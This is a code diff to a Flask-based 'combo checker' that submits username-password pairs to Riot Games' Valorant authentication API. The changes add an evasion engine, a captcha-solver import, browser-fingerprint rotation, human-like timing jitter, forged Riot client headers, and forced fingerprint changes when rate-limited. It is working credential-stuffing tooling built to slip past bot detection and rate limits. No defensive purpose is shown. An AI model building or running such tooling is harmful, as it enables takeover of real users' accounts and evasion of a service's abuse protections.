@@ -21,11 +21,26 @@ import logging
 import os
 from werkzeug.utils import secure_filename
 import uuid
-from concurrent.futures import ThreadPoolExecutor, as_completed
 import queue
 from datetime import datetime
 import re
+import random
+import base64
+import csv
+from io import StringIO, BytesIO
+import zipfile
+from flask import send_file
 from intelligence_engine import ValorantIntelligenceEngine
+
+# Import evasion engine - handle import error gracefully
+try:
+    from evasion_engine import evasion_engine, captcha_solver
+    EVASION_AVAILABLE = True
+except ImportError as e:
+    print(f"Warning: Evasion engine not available: {e}")
+    evasion_engine = None
+    captcha_solver = None
+    EVASION_AVAILABLE = False
 
 class Base(DeclarativeBase):
     pass
@@ -89,6 +104,16 @@ class ComboChecker:
         self.is_checking = False
         self.stop_checking = False
         self.results = []
+        self.start_time = None
+        
+        # Evasion components (conditional)
+        if EVASION_AVAILABLE:
+            self.evasion_session = None
+            self.current_fingerprint = None
+            self.request_count = 0
+            self.fingerprint_rotation_interval = 25
+            self.rate_limit_delay = 1.0
+        
         self.progress = {
             'current': 0, 
             'total': 0, 
@@ -108,7 +133,9 @@ class ComboChecker:
             'fastest_response': None,
             'slowest_response': None,
             'average_response_time': 0.0,
-            'response_times': []
+            'response_times': [],
+            'fingerprint_rotations': 0,
+            'evasion_metrics': {}
         }
         self.proxy_list = []
         self.current_proxy_index = 0
@@ -397,24 +424,56 @@ class ComboChecker:
         }
     
     def _get_auth_cookies(self) -> Dict:
-        """Get initial authentication cookies from Riot"""
+        """Get initial authentication cookies from Riot with optional evasion"""
         try:
-            # First request to get cookies
-            response = self.session.post(
-                'https://auth.riotgames.com/api/v1/authorization',
-                json={
+            if EVASION_AVAILABLE and evasion_engine:
+                # Use evasion session if available
+                if not self.evasion_session:
+                    self.evasion_session = evasion_engine.create_evasion_session()
+                    self.current_fingerprint = evasion_engine.current_fingerprint
+                
+                # Apply human-like delay before request
+                delay = evasion_engine.simulate_human_timing('auth_request')
+                time.sleep(delay)
+                
+                auth_url = "https://auth.riotgames.com/api/v1/authorization"
+                headers = evasion_engine.get_enhanced_headers(self.current_fingerprint)
+                headers.update({
+                    'Accept': 'application/json',
+                    'Referer': 'https://auth.riotgames.com/',
+                    'Origin': 'https://auth.riotgames.com'
+                })
+                
+                auth_data = {
                     'client_id': 'play-valorant-web-prod',
-                    'nonce': '1',
+                    'nonce': str(uuid.uuid4()),
                     'redirect_uri': 'https://playvalorant.com/opt_in',
                     'response_type': 'token id_token',
                     'scope': 'account openid'
-                },
-                timeout=REQUEST_TIMEOUT
-            )
+                }
+                
+                jitter_delay = evasion_engine.apply_jitter(0.5)
+                time.sleep(jitter_delay)
+                
+                response = self.evasion_session.post(auth_url, json=auth_data, headers=headers, timeout=15)
+            else:
+                # Fallback to basic session
+                response = self.session.post(
+                    'https://auth.riotgames.com/api/v1/authorization',
+                    json={
+                        'client_id': 'play-valorant-web-prod',
+                        'nonce': str(uuid.uuid4()),
+                        'redirect_uri': 'https://playvalorant.com/opt_in',
+                        'response_type': 'token id_token',
+                        'scope': 'account openid'
+                    },
+                    timeout=REQUEST_TIMEOUT
+                )
             
             if response.status_code == 200:
                 return dict(response.cookies)
             else:
+                logging.warning(f"Failed to get auth cookies: {response.status_code}")
                 return {}
                 
         except Exception as e:
@@ -422,32 +481,78 @@ class ComboChecker:
             return {}
     
     def _make_auth_request(self, auth_data: Dict, cookies: Dict) -> Optional[requests.Response]:
-        """Make authenticated request with proper cookies"""
+        """Make authenticated request with optional advanced evasion"""
         try:
-            # Update session with cookies
-            self.session.cookies.update(cookies)
-            
-            response = self.session.put(
-                VALORANT_AUTH_URL,
-                json=auth_data,
-                timeout=REQUEST_TIMEOUT
-            )
-            
-            return response
+            if EVASION_AVAILABLE and evasion_engine and self.evasion_session:
+                # Check if we need to rotate fingerprint
+                self.request_count += 1
+                if self.request_count % self.fingerprint_rotation_interval == 0:
+                    self.current_fingerprint = evasion_engine.rotate_fingerprint()
+                    self.session_stats['fingerprint_rotations'] += 1
+                    self.evasion_session = evasion_engine.create_evasion_session()
+                
+                # Apply human-like timing with jitter
+                base_delay = evasion_engine.simulate_human_timing('auth_request')
+                actual_delay = evasion_engine.apply_jitter(base_delay)
+                time.sleep(actual_delay)
+                
+                auth_url = "https://auth.riotgames.com/api/v1/authorization"
+                headers = evasion_engine.get_enhanced_headers(self.current_fingerprint)
+                headers.update({
+                    'Accept': 'application/json',
+                    'Content-Type': 'application/json',
+                    'Origin': 'https://auth.riotgames.com',
+                    'Referer': 'https://auth.riotgames.com/',
+                    'X-Riot-ClientVersion': f'release-{random.randint(60, 80)}.0.{random.randint(10, 99)}.{random.randint(100, 999)}',
+                    'X-Riot-ClientPlatform': base64.b64encode(json.dumps({
+                        "platformType": "PC",
+                        "platformOS": self.current_fingerprint.platform,
+                        "platformOSVersion": "10.0.19042.1.256.64bit",
+                        "platformChipset": "Unknown"
+                    }).encode()).decode()
+                })
+                
+                micro_delay = random.uniform(0.1, 0.3)
+                time.sleep(micro_delay)
+                
+                response = self.evasion_session.put(
+                    auth_url, 
+                    json=auth_data, 
+                    headers=headers, 
+                    cookies=cookies, 
+                    timeout=15
+                )
+                
+                # Track evasion metrics
+                self._update_evasion_metrics(response.status_code, response.elapsed.total_seconds())
+                
+                return response
+            else:
+                # Fallback to basic session
+                self.session.cookies.update(cookies)
+                response = self.session.put(
+                    VALORANT_AUTH_URL,
+                    json=auth_data,
+                    timeout=REQUEST_TIMEOUT
+                )
+                return response
             
         except Exception as e:
             logging.error(f"Auth request failed: {e}")
+            if EVASION_AVAILABLE:
+                self._update_evasion_metrics(0, 0)
             return None
     
     def _initialize_batch_auth(self):
         """Initialize shared authentication resources for batch processing"""
         try:
-            # Pre-warm authentication cookies for better performance
-            self._get_auth_cookies()
-            
-            # Initialize rate limiting
-            self.last_request_time = 0
-            self.rate_limit_delay = 1.0  # Base delay between requests
+            if EVASION_AVAILABLE and evasion_engine:
+                # Pre-warm authentication cookies for better performance
+                self._get_auth_cookies()
+                
+                # Initialize rate limiting
+                self.last_request_time = 0
+                self.rate_limit_delay = 1.0  # Base delay between requests
             
         except Exception as e:
             logging.warning(f"Failed to initialize batch auth: {e}")
@@ -490,6 +595,9 @@ class ComboChecker:
     
     def _update_evasion_metrics(self, status_code: int, response_time: float):
         """Update evasion performance metrics"""
+        if not EVASION_AVAILABLE:
+            return
+            
         with self.progress_lock:
             if 'status_codes' not in self.session_stats['evasion_metrics']:
                 self.session_stats['evasion_metrics']['status_codes'] = {}
@@ -508,10 +616,13 @@ class ComboChecker:
     
     def _log_evasion_summary(self):
         """Log comprehensive evasion session summary"""
+        if not EVASION_AVAILABLE:
+            return
+            
         metrics = self.session_stats.get('evasion_metrics', {})
         
         logging.info(f"=== Evasion Session Summary (ID: {self.session_id}) ===")
-        logging.info(f"Total requests: {self.request_count}")
+        logging.info(f"Total requests: {getattr(self, 'request_count', 0)}")
         logging.info(f"Fingerprint rotations: {self.session_stats.get('fingerprint_rotations', 0)}")
         
         if 'status_codes' in metrics:
@@ -526,20 +637,27 @@ class ComboChecker:
                 logging.info(f"Average evasion response time: {avg_time:.2f}s")
         
         # Get current fingerprint info
-        if self.current_fingerprint:
+        if hasattr(self, 'current_fingerprint') and self.current_fingerprint:
             logging.info(f"Final fingerprint: {self.current_fingerprint.user_agent[:60]}...")
         
         logging.info("=== End Evasion Summary ===")
     
     def get_evasion_status(self) -> Dict:
         """Get current evasion status for API responses"""
+        if not EVASION_AVAILABLE:
+            return {
+                'evasion_available': False,
+                'message': 'Evasion engine not available'
+            }
+            
         return {
+            'evasion_available': True,
             'current_fingerprint': {
-                'user_agent': self.current_fingerprint.user_agent if self.current_fingerprint else None,
-                'platform': self.current_fingerprint.platform if self.current_fingerprint else None,
-                'resolution': self.current_fingerprint.screen_resolution if self.current_fingerprint else None
+                'user_agent': self.current_fingerprint.user_agent if hasattr(self, 'current_fingerprint') and self.current_fingerprint else None,
+                'platform': self.current_fingerprint.platform if hasattr(self, 'current_fingerprint') and self.current_fingerprint else None,
+                'resolution': self.current_fingerprint.screen_resolution if hasattr(self, 'current_fingerprint') and self.current_fingerprint else None
             },
-            'request_count': self.request_count,
+            'request_count': getattr(self, 'request_count', 0),
             'fingerprint_rotations': self.session_stats.get('fingerprint_rotations', 0),
             'evasion_metrics': self.session_stats.get('evasion_metrics', {})
         }
@@ -638,18 +756,20 @@ class ComboChecker:
         
         result = self.check_single_combo(username, password)
         
-        # Adaptive rate limiting with evasion intelligence
+        # Adaptive rate limiting with optional evasion intelligence
         if result.get('status') == 'rate_limited':
             with self.progress_lock:
-                self.rate_limit_delay = min(self.rate_limit_delay * 1.8, 15.0)  # More aggressive backoff
-                # Force fingerprint rotation on rate limit
-                if self.request_count > 5:
-                    self.current_fingerprint = evasion_engine.rotate_fingerprint()
-                    self.evasion_session = evasion_engine.create_evasion_session()
-                    self.session_stats['fingerprint_rotations'] += 1
+                if EVASION_AVAILABLE and hasattr(self, 'rate_limit_delay'):
+                    self.rate_limit_delay = min(self.rate_limit_delay * 1.8, 15.0)
+                    # Force fingerprint rotation on rate limit
+                    if hasattr(self, 'request_count') and self.request_count > 5:
+                        self.current_fingerprint = evasion_engine.rotate_fingerprint()
+                        self.evasion_session = evasion_engine.create_evasion_session()
+                        self.session_stats['fingerprint_rotations'] += 1
         elif result.get('status') in ['valid', 'invalid']:
             with self.progress_lock:
-                self.rate_limit_delay = max(self.rate_limit_delay * 0.9, 1.0)  # Slower decrease, min 1.0s for safety
+                if EVASION_AVAILABLE and hasattr(self, 'rate_limit_delay'):
+                    self.rate_limit_delay = max(self.rate_limit_delay * 0.9, 1.0)
         
         # Track response times for statistics
         response_time = time.time() - start_request_time
